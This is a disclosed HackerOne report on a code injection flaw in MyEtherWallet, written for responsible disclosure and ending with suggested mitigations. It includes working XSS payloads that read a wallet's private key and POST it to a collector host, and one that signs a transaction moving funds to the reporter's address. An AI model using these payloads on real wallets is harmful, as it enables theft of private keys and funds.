@@ -1,0 +1,173 @@
+ReportLink:https://hackerone.com/reports/666062
+WeaknessName:Code Injection
+Reporter:https://hackerone.com/tw96
+ReportedTo:MyEtherWallet(myetherwallet)
+BountyAmount:2500.0
+Severity:critical
+State:Closed
+DateOfDisclosure:27.08.2019 20:55:08
+
+Summary:
+
+## Summary
+
+This vulnerability allows injection of arbitrary JavaScript code by the node that the MyEtherWallet user is connected to. This could be one of the default nodes (e.g api.myetherwallet.com), or a custom node. With this code injection, the private key can be stolen if Keystore File or Private Key access methods are used, and arbitrary transactions from the user can be signed if Mnemonic Phrase access method is used. For other access methods (MetaMask, MEWconnect, Hardware wallet), the attacker can still inject arbitrary JavaScript, but cannot directly steal the private key or funds, since MEW does not have control over these with these access methods.
+
+
+## Steps To Reproduce
+
+For Private Key or Keystore File access methods:
+
+  1. Proxy browser traffic through an intercepting proxy (e.g.OWASP ZAP)
+  	- For ZAP, this guide can be followed to setup the proxy: https://www.sarangjaiswal.com/configuring-owasp-zap-proxy-to-trace-browser-traffic.html
+  	- Note: A proxy is used to modify the response from the node, making the attack easier to demonstrate. Of course a node can choose what to respond with, and so one could also configure the node to include the attack payload, but that is more hassle.
+  2. In browser, navigate to myetherwallet.com, access-my-wallet, then log into a wallet using either private key or keystore file.
+  3. Once the wallet has been accessed, the easiest attack vector is the response of the eth_blockNumber HTTP request, which MEW sends out periodically to the connected node. Configure the proxy to intercept the response of this request.
+  	- For ZAP, click on "Add a custom HTTP break point...", enter configuration below, then click Save:
+  		- Location: Request Body
+  		- Match: Contains
+  		- String: eth_blockNumber
+  4. Now ZAP will intercept the HTTP POST request to the node, containing data of the form: `{"jsonrpc":"2.0","id":10,"method":"eth_blockNumber","params":[]}`. One can then use CTRL-S to step to the next request/response. This is most likely the response to the eth_blockNumber request, but one can check by making sure that the "id" value is the same for both. The request body initially is of the form: `{"jsonrpc":"2.0","result":"0x5d29b6","id":10}`. For the attack, we need to copy-paste our payload into the "result" parameter of this response, then click on the right facing triangle to continue to the next break point (can now turn the break point off by unchecking the box in the Break Points tab; click right facing triangle again if necessary). The payload for the Private Key and Keystore File wallet access methods is shown below, with the private key being sent to the endpoint: https://127.0.0.1:5000/privateKey. This payload should be copy-pasted to replace the hexadecimal number inside the quotes as the value of the "result" parameter:
+```javascript
+<IFRAME SRC=javascript:var&nbsp;iter=parent.window.document.getElementsByTagName('a')[1].__vue__.$store.state.wallet.privateKey.values();var&nbsp;payload='';var&nbsp;hex;for(const&nbsp;value&nbsp;of&nbsp;iter){hex=value.toString(16);if(hex.length===1){hex='0'+hex;}payload+=hex;}console.log(payload);var&nbsp;xhr=new&nbsp;XMLHttpRequest();xhr.open('POST','https://127.0.0.1:5000/privateKey',true);xhr.send(payload);></IFRAME>
+```
+   An example response body is as follows:
+```javascript
+{"jsonrpc":"2.0","result":"<IFRAME SRC=javascript:var&nbsp;iter=parent.window.document.getElementsByTagName('a')[1].__vue__.$store.state.wallet.privateKey.values();var&nbsp;payload='';var&nbsp;hex;for(const&nbsp;value&nbsp;of&nbsp;iter){hex=value.toString(16);if(hex.length===1){hex='0'+hex;}payload+=hex;}console.log(payload);var&nbsp;xhr=new&nbsp;XMLHttpRequest();xhr.open('POST','https://127.0.0.1:5000/privateKey',true);xhr.send(payload);></IFRAME>","id":10}
+```
+   The JavaScript payload in an expanded, easier to read form is shown below:
+```javascript
+var iter = parent.window.document.getElementsByTagName('a')[1].__vue__.$store.state.wallet.privateKey.values();
+var payload = '';
+var hex;
+for (const value of iter) {
+  hex = value.toString(16);
+  if (hex.length === 1) {
+    hex = '0' + hex;
+  }
+  payload += hex;
+}
+console.log(payload);
+var xhr = new XMLHttpRequest();
+xhr.open('POST', 'https://127.0.0.1:5000/privateKey', true);
+xhr.send(payload);
+```
+  5. The private key can now be observed in the HTTP traffic shown in ZAP (History tab), in the body of a POST request.
+
+
+The above steps show how we can inject code into the "result" parameter of the HTTP response to the eth_blockNumber request, thereby allowing injection and execution of arbitrary JavaScript code. It was found that spaces needed to be replaced with `&nbsp;` and that the attack string had to all be on one line, but this still allows arbitrary JavaScript code to be injected. The code is run because it is reflected in the red pop-up error box that appears upon MyEtherWallet receiving the response, and is insufficiently sanitised here. The private key can be stolen because the Vuex store can be accessed as a property of the 2nd 'a' tag in the list of all 'a' tags in the DOM. The private key can then be converted from decimal to hexadecimal in order to obtain the original key.
+
+The same steps can be carried out for a user that has accessed their wallet via Mnemonic Phrase, although the payload is different. Additionally, a way to extract the private key was not found for this access method; however, one can still steal the user's funds by signing a transaction on their behalf (using the txSigner) function, sending the user's funds to an attacker-controlled address. The payload for this is shown below:
+```javascript
+<IFRAME SRC=javascript:var&nbsp;node_url='https://127.0.0.1:4000/';var&nbsp;to_address='0xC31dc94282d793d3E351808Be9F1b7056C2F0F02';var&nbsp;amount='0x38d7ea4c68000';var&nbsp;address=parent.window.document.getElementsByTagName('a')[1].__vue__.$store.state.account.address;var&nbsp;eth_getTransactionCount_request_content={'jsonrpc':'2.0','id':1,'method':'eth_getTransactionCount','params':[address,'latest']};var&nbsp;xhr1=new&nbsp;XMLHttpRequest();xhr1.open('POST',node_url,true);xhr1.setRequestHeader('Content-type','application/json');xhr1.onreadystatechange=function(){if(this.readyState===XMLHttpRequest.DONE&&this.status===200){var&nbsp;responseNonce=JSON.parse(xhr1.responseText).result;var&nbsp;txParams={nonce:responseNonce,gasPrice:'0x53d1ac100',gasLimit:'0x5208',to:to_address,value:amount,data:'0x',chainId:3};var&nbsp;rawTransaction=parent.window.document.getElementsByTagName('a')[1].__vue__.$store.state.wallet.txSigner(txParams)._v.rawTransaction;var&nbsp;eth_sendRawTransaction_request_content={'jsonrpc':'2.0','id':2,'method':'eth_sendRawTransaction','params':[rawTransaction]};var&nbsp;xhr2=new&nbsp;XMLHttpRequest();xhr2.open('POST',node_url,true);xhr2.setRequestHeader('Content-type','application/json');xhr2.send(JSON.stringify(eth_sendRawTransaction_request_content))}};xhr1.send(JSON.stringify(eth_getTransactionCount_request_content));></IFRAME>
+```
+WARNING: running the above exploit will send Ropsten ETH to the specified address, currently my address; adjust the to_address variable to change the destination address.
+
+In an easier to read, expanded form:
+```javascript
+	/*Setup*/
+	var node_url = 'https://127.0.0.1:4000/';
+	var to_address = '0xC31dc94282d793d3E351808Be9F1b7056C2F0F02';
+	var amount = '0x38d7ea4c68000';
+
+	/*(1)*/
+	var address = parent.window.document.getElementsByTagName('a')[1].__vue__.$store.state.account.address;
+
+	/*(2)*/
+	var eth_getTransactionCount_request_content = {
+	  'jsonrpc':'2.0',
+	  'id':1,
+	  'method':'eth_getTransactionCount',
+	  'params':[address,'latest']
+	}
+	var xhr1 = new XMLHttpRequest();
+	xhr1.open('POST', node_url, true);
+	xhr1.setRequestHeader('Content-type', 'application/json');
+	xhr1.onreadystatechange = function() { // Call a function when the state changes.
+	    if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
+	    	var responseNonce = JSON.parse(xhr1.responseText).result;
+	    	/*(3)*/
+	    	var txParams = {
+	    	  nonce: responseNonce,
+	    	  gasPrice: '0x53d1ac100',
+	    	  gasLimit: '0x5208',
+	    	  to: to_address,
+	    	  value: amount,
+	    	  data: '0x',
+	    	  chainId: 3
+	    	};
+	    	var rawTransaction = parent.window.document.getElementsByTagName('a')[1].__vue__.$store.state.wallet.txSigner(txParams)._v.rawTransaction;
+	    	
+	    	/*(4)*/
+	    	var eth_sendRawTransaction_request_content = {
+	    		'jsonrpc':'2.0',
+	    		'id':2,
+	    		'method':'eth_sendRawTransaction',
+	    		'params':[rawTransaction]
+	    	};
+	    	var xhr2 = new XMLHttpRequest();
+	    	xhr2.open('POST', node_url, true);
+	    	xhr2.setRequestHeader('Content-type', 'application/json');
+	    	xhr2.send(JSON.stringify(eth_sendRawTransaction_request_content))
+	    }
+	}
+	xhr1.send(JSON.stringify(eth_getTransactionCount_request_content));
+```
+
+As can be seen in the code above, the details of the transaction are configurable, including the destination address and the transaction amount. One could even query the node to get the balance of the account, and then use that value to steal the entire contents of the account in a single transaction. There is also a msgSigner function in the same place as the txSigner function, and so it is likely that the attacker could also sign messages on behalf of the user, although this has not been specifically tested.
+
+It also also possible to combine the different payloads for these different wallet access methods into a single payload that can detect which wallet access method the user used and consequently execute the appropriate code branch. However this has not been done for this proof of concept.
+
+Although injecting into the "result" parameter of the HTTP response to the eth_blockNumber request is the easiest attack vector, since this request is automatically, periodically sent by MyEtherWallet once the user has accessed their wallet, other attack vectors also work, as shown in the table below:
+
+| Function                  | Vulnerable (Y/N) | Description                                  |
+|---------------------------|------------------|----------------------------------------------|
+| eth_blockNumber           |         Y        | Via “result” parameter                       |
+| eth_call                  |         N        |                                              |
+| eth_estimateGas           |         Y        | Via “result” parameter                       |
+| eth_gasPrice              |         Y        | Via “result” parameter and “error” parameter |
+| eth_getBalance            |         Y        | Via “result” parameter                       |
+| eth_getBlockByNumber      |         N        |                                              |
+| eth_getTransactionByHash  |         N        |                                              |
+| eth_getTransactionCount   |         N        |                                              |
+| eth_getTransactionReceipt |         N        |                                              |
+| eth_protocolVersion       |         N        |                                              |
+| eth_sendRawTransaction    |         Y        | Via “error” parameter                        |
+| web3_clientVersion        |         N        |                                              |
+
+
+Although the IFrame attack string is the most powerful, other attack strings that got through the filters and were executed in the error message are as follows:
+- `<code onmouseover=alert(1)>MOVE MOUSE OVER THIS AREA</code>`
+- Causes strike-through of remainder of message: `<s>000<s>%3cs%3e111%3c/`
+- `<a href='http://attacker.com'>XSS</a>`
+- `<IFRAME SRC=javascript:alert(9);></IFRAME>`
+- Causes GET request to be sent to MEW server (GET https://localhost:3000/javas%3C!--%20--%3Ecript:alert(8)): `<xml id='xss'><i><b><img src='javas<!-- -->cript:alert(8)'></b></i></xml><span datasrc='#xss' datafld='b' dataformatas='html'></span>`
+
+NOTE: Testing was carried out running a local version of MyEtherWallet, a local node was run and connected to for this attack and only accounts under my control were used for testing, on the Ropsten network. This was done to reduce the risk of any out of scope servers being involved, or the live MyEtherWallet site.
+
+
+## Suggested Mitigations
+
+The functions that were not susceptible to this attack typically did not reflect the contents of either the "result" or "error" parameters in the response. Instead, they displayed a generic message saying that number "0xNaN" could not be converted, rather than reflecting the payload. Such an approach is recommended for all affected functions.
+
+Altering the Content-Security-Policy by removing 'unsafe-inline' from script-src would also prevent the JavaScript used in this vulnerability from executing. I will submit a full review of the Content Security Policy soon in a separate HackerOne report.
+
+
+## Supporting Material/References
+
+I have included a video showcasing the attack, which may be easier to follow than the written steps ("MEW Malicious Node Steal Private Key Demo.webm").
+
+
+## Further Information
+
+Please let me know if you have any trouble reproducing the above steps or require further information, and I will be happy to help.
+
+## Impact
+
+The first step an attacker would need to take is becoming one of the nodes that the user connects to. This could involve setting up their own node and persuading users to connect to it, compromising an existing default node or persuading the controllers of a default node to collude with them.
+
+Once this is done the attacker is able to easily steal the funds of anyone who accesses their wallet using one of the "Software" access methods (Keystore File, Private Key or Mnemonic Phrase) while connected to their malicious node. This could be done stealthily by only injecting the payload infrequently into the response for the eth_blockNumber request. The attacker could also inject malicious JavaScript into MyEtherWallet for users that access their wallets via MetaMask, MEWconnect or Hardware wallet, allowing them to carry out phishing attacks or attempt to get the user to navigate to another malicious website, where malware may be downloaded (i.e. drive-by download attack).
+
+The attacker could potentially empty the wallets of many users while remaining undetected for quite some time, with the amount of users affected primarily depending on how suitably positioned the attacker's node is for users to connect to it.
+
+Therefore this is a serious vulnerability in MyEtherWallet that affects all MEW users connected to a malicious node, allowing compromise of many users' funds and other JavaScript injection attacks.
